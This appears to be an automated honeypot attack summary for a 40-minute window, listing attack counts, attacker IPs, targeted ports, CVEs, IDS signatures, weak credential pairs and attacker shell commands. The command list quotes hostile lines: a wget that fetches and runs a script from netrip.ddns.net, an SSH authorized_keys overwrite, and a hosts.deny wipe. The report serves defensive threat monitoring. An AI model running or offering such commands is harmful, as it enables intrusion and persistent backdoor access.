Honeypot Attack Summary Report

**Report Generation Time:** 2025-10-25T17:01:32Z
**Timeframe of Report:** 2025-10-25T16:20:01Z to 2025-10-25T17:00:01Z
**Files Used to Generate Report:**
- agg_log_20251025T162001Z.json
- agg_log_20251025T164001Z.json
- agg_log_20251025T170001Z.json

### Executive Summary

This report summarizes 28,927 attacks recorded by honeypots between 16:20 UTC and 17:00 UTC on October 25, 2025. The majority of attacks were detected by the Sentrypeer, Suricata, and Heralding honeypots. The most targeted services were SIP (port 5060) and VNC (port 5900). A significant portion of the attacks originated from the IP address 107.174.226.42. Attackers attempted to exploit several vulnerabilities, with CVE-2002-0013 and CVE-2002-0012 being the most common. A variety of shell commands were executed, indicating attempts to download and execute malicious scripts, gather system information, and manipulate SSH keys.

### Detailed Analysis

**Attacks by Honeypot:**
*   Sentrypeer: 10,988
*   Suricata: 4,175
*   Heralding: 3,843
*   Cowrie: 3,504
*   Honeytrap: 3,480
*   Ciscoasa: 1,642
*   Dionaea: 929
*   Redishoneypot: 109
*   Mailoney: 104
*   Adbhoney: 54
*   ConPot: 24
*   Tanner: 22
*   Dicompot: 18
*   H0neytr4p: 16
*   Honeyaml: 12
*   ElasticPot: 4
*   Ipphoney: 3

**Top Attacking IPs:**
*   107.174.226.42: 10,871
*   185.243.96.105: 3,840
*   189.181.215.41: 1,936
*   80.94.95.238: 1,836
*   143.198.96.196: 1,247
*   114.37.149.144: 881
*   167.71.65.227: 409
*   103.218.240.181: 226
*   107.170.36.5: 233
*   193.24.211.28: 205

**Top Targeted Ports/Protocols:**
*   5060: 10,988
*   vnc/5900: 3,840
*   TCP/445: 1,931
*   445: 885
*   22: 582
*   8333: 205
*   6379: 98
*   5903: 124
*   25: 104
*   UDP/5060: 66

**Most Common CVEs:**
*   CVE-2002-0013 CVE-2002-0012
*   CVE-2002-0013 CVE-2002-0012 CVE-1999-0517
*   CVE-2019-11500 CVE-2019-11500
*   CVE-2021-3449 CVE-2021-3449

**Commands Attempted by Attackers:**
*   `cd ~; chattr -ia .ssh; lockr -ia .ssh`
*   `lockr -ia .ssh`
*   `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa ...">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~`
*   `cat /proc/cpuinfo | grep name | wc -l`
*   `cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'`
*   `free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'`
*   `ls -lh $(which ls)`
*   `which ls`
*   `crontab -l`
*   `w`
*   `uname -m`
*   `cat /proc/cpuinfo | grep model | grep name | wc -l`
*   `top`
*   `uname`
*   `uname -a`
*   `whoami`
*   `lscpu | grep Model`
*   `df -h | head -n 2 | awk 'FNR == 2 {print $2;}'`
*   `rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;`
*   `cd /data/local/tmp/; busybox wget http://netrip.ddns.net/w.sh; sh w.sh; ...`

**Signatures Triggered:**
*   ET EXPLOIT [PTsecurity] DoublePulsar Backdoor installation communication: 1929
*   ET SCAN MS Terminal Server Traffic on Non-standard Port: 999
*   ET DROP Dshield Block Listed Source group 1: 310
*   ET SCAN NMAP -sS window 1024: 168
*   ET HUNTING RDP Authentication Bypass Attempt: 113
*   ET VOIP REGISTER Message Flood UDP: 55
*   ET INFO Reserved Internal IP Traffic: 54

**Users / Login Attempts:**
*   /1q2w3e4r: 17
*   /passw0rd: 16
*   /Passw0rd: 14
*   345gs5662d34/345gs5662d34: 8
*   root/f3d3k1: 4
*   root/f4ct0r2015: 4
*   root/F4r0l1t0.: 4
*   root/f50aS1: 4
*   /1qaz2wsx: 4

**Files Uploaded/Downloaded:**
*   wget.sh;: 16
*   w.sh;: 4
*   c.sh;: 4
*   json: 1

**HTTP User-Agents:**
*   *None observed in this period.*

**SSH Clients:**
*   *None observed in this period.*

**SSH Servers:**
*   *None observed in this period.*

**Top Attacker AS Organizations:**
*   *None observed in this period.*

### Key Observations and Anomalies

*   **High Volume of SIP and VNC Scans:** The overwhelming majority of attacks targeted SIP and VNC services, suggesting widespread, automated scanning for these protocols.
*   **Dominant Attacker IP:** The IP address 107.174.226.42 was responsible for over a third of all recorded attacks, indicating a single, highly active threat source.
*   **Repetitive Command Execution:** Many of the executed commands are typical of automated scripts used for reconnaissance and malware installation. The frequent use of commands to manipulate SSH authorized_keys files is a common technique for establishing persistent access.
*   **DoublePulsar Backdoor Activity:** The most frequently triggered signature is related to the DoublePulsar backdoor, which is associated with the EternalBlue exploit. This suggests that attackers are still actively attempting to compromise systems using this well-known vulnerability.
*   **Lack of Sophistication:** The observed attacks are largely automated and unsophisticated, relying on common vulnerabilities and default credentials. This is typical of botnet activity.
